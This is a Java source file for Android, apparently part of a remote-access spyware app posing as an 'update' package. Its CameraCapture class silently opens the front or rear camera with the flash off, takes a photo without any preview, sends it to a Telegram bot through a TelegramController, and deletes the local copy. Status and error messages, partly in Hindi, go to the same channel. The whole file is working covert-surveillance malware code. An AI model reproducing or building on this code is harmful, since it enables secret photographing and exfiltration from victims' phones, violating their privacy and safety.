package com.kasari.update;

import android.content.Context;
import android.graphics.*;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.*;
import android.view.Surface;
import java.io.*;
import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraCapture {

    public static void capture(Context ctx, boolean rear) {
        new Thread(() -> doCapture(ctx, rear)).start();
    }

    private static void doCapture(Context ctx, boolean rear) {
        CameraManager mgr = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        if (mgr == null) {
            TelegramController.sendMessage("❌ Camera service unavailable.");
            return;
        }
        try {
            String cameraId = null;
            for (String id : mgr.getCameraIdList()) {
                CameraCharacteristics chars = mgr.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (rear && facing == CameraCharacteristics.LENS_FACING_BACK) { cameraId = id; break; }
                if (!rear && facing == CameraCharacteristics.LENS_FACING_FRONT) { cameraId = id; break; }
            }
            if (cameraId == null && mgr.getCameraIdList().length > 0)
                cameraId = mgr.getCameraIdList()[0];
            if (cameraId == null) {
                TelegramController.sendMessage("❌ Camera nahi mila.");
                return;
            }

            HandlerThread ht = new HandlerThread("CamThread");
            ht.start();
            Handler handler = new Handler(ht.getLooper());

            ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(r -> {
                try (Image img = r.acquireLatestImage()) {
                    if (img == null) return;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    File f = new File(ctx.getCacheDir(), "cam_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(bytes); fos.close();
                    TelegramController.sendPhoto(f, (rear ? "📷 Rear" : "🤳 Front") + " Camera");
                    f.delete();
                } catch (Exception e) { e.printStackTrace(); }
                ht.quit();
            }, handler);

            mgr.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder =
                            camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                        builder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF);

                        camera.createCaptureSession(
                            Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                                            @Override
                                            public void onCaptureCompleted(CameraCaptureSession s, CaptureRequest req, TotalCaptureResult res) {
                                                camera.close();
                                            }
                                        }, handler);
                                    } catch (Exception e) { camera.close(); ht.quit(); }
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) { camera.close(); ht.quit(); }
                            }, handler);
                    } catch (Exception e) { camera.close(); ht.quit(); }
                }
                @Override public void onDisconnected(CameraDevice camera) { camera.close(); ht.quit(); }
                @Override public void onError(CameraDevice camera, int error) {
                    TelegramController.sendMessage("❌ Camera error: " + error);
                    camera.close(); ht.quit();
                }
            }, handler);

        } catch (SecurityException se) {
            TelegramController.sendMessage("❌ Camera permission nahi hai.");
        } catch (Exception e) {
            TelegramController.sendMessage("❌ Camera error: " + e.getMessage());
        }
    }
}
